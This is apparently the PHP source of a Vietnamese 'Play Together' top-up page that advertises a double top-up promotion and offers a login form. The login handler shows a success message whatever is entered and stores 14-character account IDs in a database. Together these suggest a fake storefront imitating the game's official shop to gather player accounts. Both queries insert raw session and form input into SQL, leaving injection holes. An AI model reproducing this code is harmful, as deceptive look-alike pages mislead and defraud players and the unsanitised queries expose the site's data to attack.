<?php
include ('duchoang_config/config.php');
include ('duchoang_config/header.php');
?>
<!--- Tiêu Đề --->
<title>Chọn Gói | <?php echo $duchoang_title; ?> - <?php echo $duchoang_name; ?></title>
  <?php
  if(!$_SESSION['user']){
  ?>
<div class="page-content">
    <div class="container">
        <img src="<?php echo $duchoang_banner; ?>" width="100%" alt="nạp thẻ play together">
        <div class="content-area card col-12">
            <div class="card-innr">
                <p><b><span style="color: #1c8eff;">Play Together – Topup Center</span></b></p>
                <p><b>Play Together – Gặp Gỡ Bạn Bè Khắp Năm Châu</b> - Vũ Trụ Ảo Với Những Người Bạn Trên Toàn Thế Giới Đã Đến - <b>Play Together</b> Sẽ Hiện Thực Hóa Ước Mơ Của Bạn, Giúp Bạn Thỏa Sức Giải Trí, Tham Gia Những Chuyến Đi Đặc Biệt, Đồng Thời Gặp Gỡ Những Người Bạn Mới Từ Khắp Nơi Trên Thế Giới.</p>
        <div class="content-area card col-12">
       <ul class="nav nav-tabs nav-tabs-line" role="tablist">
                    <li class="nav-item">
                        <a class="nav-link active show" data-toggle="tab" href="#nap-the-play-together"><span class="pay-title"><span class="pay-cur">Chọn Gói</span></span></a>
                    </li>
                </ul>
<div class="tab-content" id="profile-details">
<div class="tab-pane fade active show" id="nap-the-play-together">
<div class="token-statistics card card-token height-auto col-12">
<div class="card-innr">
<div class="token-balance">
<div class="token-balance-text">
<h6 class="card-sub-title text-center"><span style="color: white;">Khuyễn Mãi Cực Hot! Tưng Bừng Tết Đến Xuân Về Trang Chủ Play Together Khuyến Mãi X2 Nạp Thẻ.</span>
</div>
</div>
</div>
 </div>                
            <div class="tab-content" id="profile-details">
                    <div class="tab-pane fade active show" id="nap-the-play-together">
                    <font size="+1"><p><b>Chọn Gói Vật Phẩm Bạn Muốn Thanh Toán.</b></p></font></br>
                    <a href="/nap-da-quy"><p><img src="<?php echo $duchoang_napdaquy;?>" alt="Nạp Đá Quý" width="170" height="50" /></p></a>
                    <br>
                    <a href="/goi-san-pham" target="_blank"><p><img src="<?php echo $duchoang_goisanpham;?>" alt="Mua Vật Phẩm" width="170" height="50" /></p></a>
                    <br>
</form></div>
<br>
<?php }else{ ?> 
<?php } ?>
<?php
$taikhoan = mysqli_fetch_array(mysqli_query($connect, "SELECT * FROM user WHERE taikhoan = '".$_SESSION['user']."'"));
    if(isset($_POST['dangnhap'])){
      $taikhoan = $_POST['taikhoan'];
      echo '<meta http-equiv="refresh" content="1;url=/loading.php?=connecting">';
          if(strlen($taikhoan) < 14 || strlen($taikhoan) > 14){
         echo '<script>Swal.fire("Thông Báo", "Đăng Nhập Thành Công!", "success");</script>';
          }else{
          $kiemtra = mysqli_num_rows(mysqli_query($connect, "SELECT * FROM user WHERE taikhoan = '$taikhoan' "));
            $save = mysqli_query($connect,
                  "INSERT INTO `user` (`id`, `taikhoan`) VALUES (NULL, '$taikhoan')");
 echo '<script>Swal.fire("Thông Báo", "Đăng Nhập Thành Công!", "success");</script>';
                    $_SESSION['user'] = $taikhoan;

                    }
                  }
                    ?>
<?php
include ('duchoang_config/footer.php');
?>